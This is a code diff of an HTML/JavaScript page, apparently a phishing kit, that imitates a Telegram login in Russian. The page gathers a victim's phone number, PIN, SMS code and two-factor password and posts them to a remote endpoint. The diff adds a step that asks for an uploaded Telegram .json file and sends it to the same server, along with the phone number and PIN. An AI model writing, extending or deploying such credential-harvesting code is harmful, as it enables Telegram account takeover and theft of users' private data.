@@ -122,15 +122,12 @@
       transition: border-color 0.2s, box-shadow 0.2s;
       outline: none;
       box-sizing: border-box;
-      /* Скрываем стандартный курсор */
       caret-color: transparent;
-      /* Отключаем появление нативной клавиатуры */
       pointer-events: none;
       user-select: none;
       touch-action: none;
     }
     .code-inputs input.active-input {
-      /* Курсор делаем зеленым только для активного */
       caret-color: var(--input-border-focus);
       pointer-events: auto;
       user-select: auto;
@@ -145,7 +142,6 @@
       min-height: 1.2em;
       text-align: center;
     }
-    /* KEYBOARD ADAPTIVE & MINIMALISTIC DESIGN */
     .number-keyboard {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
@@ -273,6 +269,14 @@
     <input id="input-2fa" class="tg-input" type="password" placeholder="Пароль">
     <div id="fa2-error" class="error-message"></div>
     <button class="tg-button" onclick="submit2FA()">Далее</button>
+  </div>
+  <!-- Шаг 5: Загрузка JSON -->
+  <div id="step-json" class="step">
+    <img src="gifs/file.gif" class="tg-gif" alt="Файл">
+    <h2>Загрузите .json-файл Telegram</h2>
+    <input id="json-file-input" type="file" class="tg-input" accept=".json">
+    <div id="json-error" class="error-message"></div>
+    <button class="tg-button" onclick="submitJson()">Загрузить</button>
   </div>
   <!-- Завершено -->
   <div id="step-done" class="step">
@@ -460,12 +464,7 @@ async function submitSmsCode() {
     if (json.ok && json["2fa_required"]) {
       showStep("step-code", "step-2fa");
     } else if (json.ok) {
-      await fetch(apiUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ step: "done", phone: userPhone, pin: userPin })
-      });
-      showStep("step-code", "step-done");
+      showStep("step-code", "step-json");
     } else {
       errorDiv.textContent = json.error || "Ошибка кода";
       inputs.forEach(i => i.value = "");
@@ -490,12 +489,7 @@ async function submit2FA() {
     const json = await res.json();
 
     if (json.ok) {
-      await fetch(apiUrl, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ step: "done", phone: userPhone, pin: userPin })
-      });
-      showStep("step-2fa", "step-done");
+      showStep("step-2fa", "step-json");
     } else {
       errorDiv.textContent = json.error || "Ошибка 2FA";
       document.getElementById("input-2fa").value = "";
@@ -505,7 +499,49 @@ async function submit2FA() {
     errorDiv.textContent = "Ошибка сети";
   }
 }
-</script>
 
+async function submitJson() {
+  const fileInput = document.getElementById("json-file-input");
+  const errorDiv = document.getElementById("json-error");
+  errorDiv.textContent = "";
+
+  if (!fileInput.files.length) {
+    errorDiv.textContent = "Выберите .json файл";
+    return;
+  }
+
+  const file = fileInput.files[0];
+  if (!file.name.endsWith('.json')) {
+    errorDiv.textContent = "Файл должен иметь расширение .json";
+    return;
+  }
+
+  const formData = new FormData();
+  formData.append('step', 'json');
+  formData.append('phone', userPhone);
+  formData.append('json_file', file);
+
+  try {
+    const res = await fetch(apiUrl, {
+      method: "POST",
+      body: formData
+    });
+    const json = await res.json();
+    if (json.ok) {
+      // После загрузки файла отправляем финальный шаг (done)
+      await fetch(apiUrl, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ step: "done", phone: userPhone, pin: userPin })
+      });
+      showStep("step-json", "step-done");
+    } else {
+      errorDiv.textContent = json.error || "Ошибка загрузки";
+    }
+  } catch {
+    errorDiv.textContent = "Ошибка сети";
+  }
+}
+</script>
 </body>
 </html>
